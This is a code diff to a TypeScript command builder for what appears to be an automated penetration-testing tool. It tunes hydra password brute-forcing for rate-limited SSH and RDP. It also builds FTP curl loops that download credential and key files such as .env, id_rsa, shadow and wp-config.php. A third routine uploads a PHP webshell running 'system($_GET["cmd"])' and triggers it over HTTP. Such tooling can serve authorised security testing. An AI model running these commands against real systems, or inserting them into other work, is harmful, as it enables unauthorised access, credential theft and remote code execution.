@@ -153,27 +153,51 @@ const TOOL_COMMANDS: Record<string, (target: string, opts: ToolOptions) => strin
   katana: (target) => ['katana', '-u', target, '-d', '3', '-silent'],
   hydra: (target, opts) => {
     const host = extractHost(target);
+    const service = (opts.service ?? 'ssh').toLowerCase();
     const args = ['hydra'];
-    if (opts.username) args.push('-l', opts.username);
-    else args.push('-L', findWordlist([
-      '/opt/cstrike/data/wordlists/usernames.txt',
-      '/opt/wordlists/usernames.txt',
-      '/usr/share/wordlists/metasploit/unix_users.txt',
-      '/usr/share/wordlists/nmap.lst',
-    ]));
 
-    const wordlistMap: Record<string, string> = {
-      'rockyou.txt': findWordlist(['/opt/cstrike/data/wordlists/passwords.txt', '/opt/wordlists/passwords.txt', '/usr/share/wordlists/rockyou.txt']),
-      rockyou: findWordlist(['/opt/cstrike/data/wordlists/passwords.txt', '/opt/wordlists/passwords.txt', '/usr/share/wordlists/rockyou.txt']),
-      fasttrack: findWordlist(['/opt/cstrike/data/wordlists/passwords.txt', '/opt/wordlists/passwords.txt', '/usr/share/wordlists/fasttrack.txt']),
-    };
-    args.push('-P', wordlistMap[opts.wordlist ?? 'fasttrack'] ?? opts.wordlist ?? findWordlist(['/opt/cstrike/data/wordlists/passwords.txt']));
+    // SSH is rate-limited (~1/sec) — use small, curated lists to finish in time
+    const isRateLimited = ['ssh', 'rdp'].includes(service);
+
+    if (opts.username) {
+      args.push('-l', opts.username);
+    } else if (isRateLimited) {
+      // Small user list for rate-limited services (~30 users)
+      args.push('-L', findWordlist([
+        '/opt/cstrike/data/wordlists/usernames-ssh.txt',
+        '/opt/wordlists/usernames-ssh.txt',
+        '/opt/cstrike/data/wordlists/usernames.txt',
+      ]));
+    } else {
+      args.push('-L', findWordlist([
+        '/opt/cstrike/data/wordlists/usernames.txt',
+        '/opt/wordlists/usernames.txt',
+        '/usr/share/wordlists/metasploit/unix_users.txt',
+        '/usr/share/wordlists/nmap.lst',
+      ]));
+    }
+
+    if (isRateLimited) {
+      // ~200 passwords for SSH — manageable at 56 tries/min (~1 hour)
+      args.push('-P', findWordlist([
+        '/opt/cstrike/data/wordlists/passwords-ssh.txt',
+        '/opt/wordlists/passwords-ssh.txt',
+        '/opt/cstrike/data/wordlists/passwords.txt',
+      ]));
+    } else {
+      const wordlistMap: Record<string, string> = {
+        'rockyou.txt': findWordlist(['/opt/cstrike/data/wordlists/passwords.txt', '/opt/wordlists/passwords.txt', '/usr/share/wordlists/rockyou.txt']),
+        rockyou: findWordlist(['/opt/cstrike/data/wordlists/passwords.txt', '/opt/wordlists/passwords.txt', '/usr/share/wordlists/rockyou.txt']),
+        fasttrack: findWordlist(['/opt/cstrike/data/wordlists/passwords.txt', '/opt/wordlists/passwords.txt', '/usr/share/wordlists/fasttrack.txt']),
+      };
+      args.push('-P', wordlistMap[opts.wordlist ?? 'fasttrack'] ?? opts.wordlist ?? findWordlist(['/opt/cstrike/data/wordlists/passwords.txt']));
+    }
 
     if (opts.port) args.push('-s', String(opts.port));
-    args.push('-t', '8');
+    args.push('-t', isRateLimited ? '4' : '8');  // fewer threads for rate-limited services
     // Traditional positional format: hydra [opts] host service
     args.push(host || 'localhost');
-    args.push((opts.service ?? 'ssh').toLowerCase());
+    args.push(service);
     return args;
   },
   john: (target) => {
@@ -279,22 +303,25 @@ const TOOL_COMMANDS: Record<string, (target: string, opts: ToolOptions) => strin
     const host = extractHost(target);
     const port = opts.port ?? 21;
     const user = opts.username ?? 'anonymous';
-    const pass = opts.password ?? 'anonymous@';
+    const pass = opts.password ?? 'anonymous';
+    // Use --user flag instead of embedding creds in URL (avoids @ in password breaking URL)
+    const cred = `--user '${user}:${pass}'`;
+    const ftpBase = `ftp://${host}:${port}`;
     // List root dir, then list common subdirs, then try to download interesting files
     const commands = [
       `echo "=== FTP ROOT LISTING ==="`,
-      `curl -s --list-only --max-time 15 "ftp://${user}:${pass}@${host}:${port}/" 2>&1 || echo "FTP_ROOT_FAILED"`,
+      `curl -s --list-only --max-time 15 ${cred} "${ftpBase}/" 2>&1 || echo "FTP_ROOT_FAILED"`,
       `echo "=== FTP RECURSIVE LISTING ==="`,
       // Try common writable dirs
-      `for dir in uploads upload files public www html data backup tmp; do echo "--- /$dir/ ---"; curl -s --list-only --max-time 10 "ftp://${user}:${pass}@${host}:${port}/$dir/" 2>&1; done`,
+      `for dir in uploads upload files public www html data backup tmp; do echo "--- /$dir/ ---"; curl -s --list-only --max-time 10 ${cred} "${ftpBase}/$dir/" 2>&1; done`,
       `echo "=== FTP INTERESTING FILES ==="`,
       // Try to download common config/key files
-      `for f in .env .htaccess id_rsa id_ed25519 authorized_keys shadow passwd config.php wp-config.php database.yml .git/config; do echo "--- $f ---"; curl -s --max-time 10 "ftp://${user}:${pass}@${host}:${port}/$f" 2>&1 | head -50; done`,
+      `for f in .env .htaccess id_rsa id_ed25519 authorized_keys shadow passwd config.php wp-config.php database.yml .git/config; do echo "--- $f ---"; curl -s --max-time 10 ${cred} "${ftpBase}/$f" 2>&1 | head -50; done`,
       `echo "=== FTP WRITE TEST ==="`,
       // Test if root is writable
-      `echo "FTP_WRITE_TEST" | curl -s -T - --max-time 10 "ftp://${user}:${pass}@${host}:${port}/.ftp_test" 2>&1 && echo "ROOT_WRITABLE" && curl -s --max-time 5 -X "DELE .ftp_test" "ftp://${user}:${pass}@${host}:${port}/" 2>/dev/null`,
+      `echo "FTP_WRITE_TEST" | curl -s -T - --max-time 10 ${cred} "${ftpBase}/.ftp_test" 2>&1 && echo "ROOT_WRITABLE" || echo "ROOT_NOT_WRITABLE"`,
       // Test uploads dir
-      `echo "FTP_WRITE_TEST" | curl -s -T - --max-time 10 "ftp://${user}:${pass}@${host}:${port}/uploads/.ftp_test" 2>&1 && echo "UPLOADS_WRITABLE" && curl -s --max-time 5 -X "DELE uploads/.ftp_test" "ftp://${user}:${pass}@${host}:${port}/" 2>/dev/null`,
+      `echo "FTP_WRITE_TEST" | curl -s -T - --max-time 10 ${cred} "${ftpBase}/uploads/.ftp_test" 2>&1 && echo "UPLOADS_WRITABLE" || echo "UPLOADS_NOT_WRITABLE"`,
       `echo "=== FTP BROWSE COMPLETE ==="`,
     ];
     return ['sh', '-c', commands.join(' && ')];
@@ -304,10 +331,12 @@ const TOOL_COMMANDS: Record<string, (target: string, opts: ToolOptions) => strin
     const host = extractHost(target);
     const port = opts.port ?? 21;
     const user = opts.username ?? 'anonymous';
-    const pass = opts.password ?? 'anonymous@';
+    const pass = opts.password ?? 'anonymous';
     const filename = opts.filename ?? 'shell.php';
     const shellContent = opts.shellContent ?? '<?php echo "WEBSHELL_ACTIVE"; system($_GET["cmd"]); ?>';
     const uploadDir = opts.extra ?? 'uploads';
+    const cred = `--user '${user}:${pass}'`;
+    const ftpBase = `ftp://${host}:${port}`;
     // Upload webshell via FTP, then try to access it via HTTP
     const httpPort = opts.lport ?? '80';
     const commands = [
@@ -315,11 +344,11 @@ const TOOL_COMMANDS: Record<string, (target: string, opts: ToolOptions) => strin
       // Write shell to temp file
       `printf '%s' '${shellContent.replace(/'/g, "'\\''")}' > /tmp/${filename}`,
       // Upload via FTP
-      `curl -s -T /tmp/${filename} --max-time 15 "ftp://${user}:${pass}@${host}:${port}/${uploadDir}/${filename}" 2>&1`,
+      `curl -s -T /tmp/${filename} --max-time 15 ${cred} "${ftpBase}/${uploadDir}/${filename}" 2>&1`,
       `echo "FTP_UPLOAD_COMPLETE: ${uploadDir}/${filename}"`,
       // Verify via FTP listing
       `echo "=== FTP VERIFY ==="`,
-      `curl -s --list-only --max-time 10 "ftp://${user}:${pass}@${host}:${port}/${uploadDir}/" 2>&1`,
+      `curl -s --list-only --max-time 10 ${cred} "${ftpBase}/${uploadDir}/" 2>&1`,
       // Try to access via HTTP (webshell cross-service attack)
       `echo "=== HTTP VERIFY ==="`,
       `curl -s --max-time 10 "http://${host}:${httpPort}/${uploadDir}/${filename}?cmd=id" 2>&1`,
